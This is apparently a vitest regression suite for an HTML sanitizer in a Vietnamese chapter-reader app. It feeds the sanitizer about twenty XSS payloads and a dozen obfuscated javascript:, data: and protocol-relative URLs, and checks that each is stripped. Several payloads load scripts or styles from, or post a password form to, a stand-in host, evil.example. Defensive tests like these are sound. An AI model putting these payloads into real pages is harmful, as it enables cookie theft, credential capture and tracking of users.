import { describe, expect } from 'vitest';
import { sanitizeChapterHtml } from './sanitize-chapter-html.ts';

describe('sanitizeChapterHtml: XSS regression', () => {
  const safeHtml = '<p id="p-1">Safe content</p>';

  const payloads = [
    {
      name: 'inline script',
      html: '<script>alert(document.cookie)</script>',
    },
    {
      name: 'external script',
      html: '<script src="https://evil.example/x.js"></script>',
    },
    {
      name: 'SVG onload',
      html: '<svg onload="alert(1)"><circle /></svg>',
    },
    {
      name: 'SVG foreignObject',
      html:
        '<svg><foreignObject>' +
        '<p onclick="alert(1)">Click in SVG</p>' +
        '</foreignObject></svg>',
    },
    {
      name: 'MathML',
      html: '<math><mtext><img src="x" onerror="alert(1)"></mtext></math>',
    },
    {
      name: 'image onerror',
      html: '<img src="x"  onerror="alert(1)">',
    },
    {
      name: 'remote image without event handler',
      html: '<img src="https://evil.example/tracking.png">',
    },
    {
      name: 'iframe with fallback content',
      html: '<iframe src="https://evil.example"><p>Hide</p></iframe>',
    },
    {
      name: 'CSS import and URL',
      html:
        '<style>@import "https://evil.example/x.css";' +
        'body { background: url("https://evil.example/track"); }</style>',
    },
    {
      name: 'form submission',
      html:
        '<form action="https://evil.example" method="post">' +
        '<input name="password"><button>Gửi</button></form>',
    },
    {
      name: 'object embedding',
      html: '<object data="https://evil.example"><p>Ẩn</p></object>',
    },
    {
      name: 'embed',
      html: '<embed src="https://evil.example">',
    },
    {
      name: 'template',
      html: '<template><p onclick="alert(1)">Ẩn</p></template>',
    },
    {
      name: 'textarea raw text',
      html: '<textarea><img src="x" onerror="alert(1)"></textarea>',
    },
    {
      name: 'xmp raw text',
      html: '<xmp><img src="x" onerror="alert(1)"></xmp>',
    },
    {
      name: 'noscript',
      html: '<noscript><img src="x" onerror="alert(1)"></noscript>',
    },
    {
      name: 'base URL injection',
      html: '<base href="https://evil.example">',
    },
    {
      name: 'meta refresh',
      html: '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    },
    {
      name: 'stylesheet link',
      html: '<link rel="stylesheet" href="https://evil.example/x.css">',
    },
    {
      name: 'HTML comment',
      html: '<!-- <img src="x" onerror="alert(1)"> -->',
    },
  ];

  it.each(payloads)('removes $name', ({ html }) => {
    const result = sanitizeChapterHtml('<p>Safe content</p>' + html);

    expect(result).toBe(safeHtml);
    expect(sanitizeChapterHtml(result)).toBe(result);
  });

  it.each([
    'JaVaScRiPt:alert(1)',
    'javascript&#58;alert(1)',
    '&#106;avascript:alert(1)',
    'java&#x73;cript:alert(1)',
    'java&#x09;script:alert(1)',
    'java&#x0A;script:alert(1)',
    'java&#x0D;script:alert(1)',
    '\tjavascript:alert(1)',
    '\njavascript:alert(1)',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    '&#47;&#47;evil.example/path',
    'ftp://evil.example/book',
  ])('removes obfuscated or forbidden URL: %s', (href) => {
    expect(sanitizeChapterHtml(`<a href="${href}">Continue...</a>`)).toBe(
      '<a>Continue...</a>',
    );
  });

  it('removes event handlers, CSS and arbitrary attributes', () => {
    const result = sanitizeChapterHtml(
      '<p id="custom" class="book" data-index="99" ' +
        'style="background:url(https://evil.example)" ' +
        'onmouseover="alert(1)" onfocus="alert(1)" tabindex="0">' +
        'Vietnamese <strong onclick="alert(1)">safe</strong></p>',
    );

    expect(result).toBe('<p id="p-1">Vietnamese <strong>safe</strong></p>');
  });

  it('preserves escaped markup as text rather than executable HTML', () => {
    const result = sanitizeChapterHtml(
      '<p>&lt;script&gt;alert(1)&lt;/script&gt; &amp; tiếng Việt</p>',
    );

    expect(result).toBe(
      '<p id="p-1">&lt;script&gt;alert(1)&lt;/script&gt; &amp; tiếng Việt</p>',
    );

    expect(sanitizeChapterHtml(result)).toBe(result);
  });

  it('escapes quotes in permitted attributes', () => {
    const result = sanitizeChapterHtml(
      '<a href="https://example.com/book" ' +
        'title="&quot; onmouseover=&quot;alert(1)">Sách</a>',
    );

    expect(result).toBe(
      '<a title="&quot; onmouseover=&quot;alert(1)" ' +
        'href="https://example.com/book" ' +
        'rel="noopener noreferrer nofollow">Sách</a>',
    );

    expect(sanitizeChapterHtml(result)).toBe(result);
  });

  it('repairs unclosed paragraphs and still generates stable anchors', () => {
    const result = sanitizeChapterHtml('<p>Một<p>Hai');

    expect(result).toBe('<p id="p-1">Một</p><p id="p-2">Hai</p>');
    expect(sanitizeChapterHtml(result)).toBe(result);
  });

  it('does not count paragraphs inside discarded containers', () => {
    const result = sanitizeChapterHtml(
      '<svg><foreignObject><p>Ẩn</p></foreignObject></svg>' +
        '<p>Một</p>' +
        '<form><p>Ẩn</p></form>' +
        '<blockquote><p>Hai</p></blockquote>',
    );

    expect(result).toBe(
      '<p id="p-1">Một</p>' + '<blockquote><p id="p-2">Hai</p></blockquote>',
    );
  });
});

describe('sanitizeChapterHtml: permitted links', () => {
  it.each([
    'http://example.com/book',
    'https://example.com/book?q=reading#chapter',
    'mailto:reader@example.com',
  ])('preserves %s and assigns the required rel', (href) => {
    expect(sanitizeChapterHtml(`<a href="${href}">Liên kết</a>`)).toBe(
      `<a href="${href}" rel="noopener noreferrer nofollow">Liên kết</a>`,
    );
  });
});

describe('sanitizeChapterHtml: list numbering', () => {
  it.each([
    ['0', '0'],
    ['-3', '-3'],
    ['0003', '3'],
    ['-2147483648', '-2147483648'],
    ['2147483647', '2147483647'],
  ])('normalizes valid integer %s to %s', (input, expected) => {
    expect(
      sanitizeChapterHtml(
        `<ol start="${input}"><li value="${input}">Mục</li></ol>`,
      ),
    ).toBe(`<ol start="${expected}"><li value="${expected}">Mục</li></ol>`);
  });

  it.each([
    '',
    'abc',
    '1.5',
    '1e3',
    'Infinity',
    '2147483648',
    '2147483847',
    '-2147483649',
    '999999999999999999999999',
  ])('removes invalid integer %s', (value) => {
    expect(
      sanitizeChapterHtml(
        `<ol start="${value}"><li value="${value}">Mục</li></ol>`,
      ),
    ).toBe('<ol><li>Mục</li></ol>');
  });
});
